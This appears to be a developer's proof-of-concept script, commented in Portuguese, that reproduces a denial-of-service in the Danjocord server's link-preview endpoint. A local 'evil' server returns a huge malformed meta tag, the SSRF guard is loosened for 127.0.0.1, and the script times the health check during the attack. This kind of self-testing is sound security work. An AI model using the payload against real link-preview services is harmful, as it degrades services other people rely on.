process.env.DANJOCORD_DEV_AUTH = "1";
process.env.NODE_ENV = "test";
const R = "file:///E:/code/Danjocord/apps/server/dist";
const { createServer } = await import("node:http");
const Fastify = (await import("fastify")).default;
const { openDb } = await import(`${R}/db/index.js`);
const { Store } = await import(`${R}/store.js`);
const { registerLinkRoutes } = await import(`${R}/links/routes.js`);
const { blockedAddressReason } = await import(`${R}/links/guard.js`);

const N = Number(process.argv[2] ?? 120000);
const BODY = "<meta " + "a".repeat(N) + ">";
console.log(`payload = ${Buffer.byteLength(BODY)} bytes (teto do fetch = ${512*1024})`);

// servidor "evil.example" — no ataque real e um host publico na porta 80
const evil = createServer((_q, res) => {
  res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
  res.end(BODY);
});
await new Promise((r) => evil.listen(0, "127.0.0.1", r));
const evilPort = evil.address().port;

const db = openDb(":memory:");
const app = Fastify();
app.get("/healthz", async () => ({ ok: true }));
// injecao SO para o alvo de teste morar em 127.0.0.1:porta-alta; em producao
// e um host publico na 80 e passa pela politica REAL sem nenhuma mudanca
registerLinkRoutes(app, new Store(db), {
  fetchDeps: { allowAnyPort: true, blockedAddressReason: (ip) => (ip === "127.0.0.1" ? null : blockedAddressReason(ip)) },
});
await app.listen({ port: 0, host: "127.0.0.1" });
const port = app.server.address().port;

const ms = async (f) => { const t = Date.now(); const r = await f(); return [Date.now() - t, r]; };
const health = () => fetch(`http://127.0.0.1:${port}/healthz`).then((r) => r.status);

console.log(`healthz ocioso: ${(await ms(health))[0]} ms`);

const target = encodeURIComponent(`http://127.0.0.1:${evilPort}/x?i=1`);
const attack = ms(() => fetch(`http://127.0.0.1:${port}/api/link-preview?url=${target}`,
  { headers: { authorization: "Bearer dev.atacante" } }).then((r) => r.status));

await new Promise((r) => setTimeout(r, 300)); // deixa o fetch do alvo acontecer
const [hms, hstatus] = await ms(health);
console.log(`healthz DURANTE o ataque: ${hms} ms (status ${hstatus})`);
const [ams, astatus] = await attack;
console.log(`ataque: ${ams} ms, status ${astatus}`);
evil.close(); await app.close();
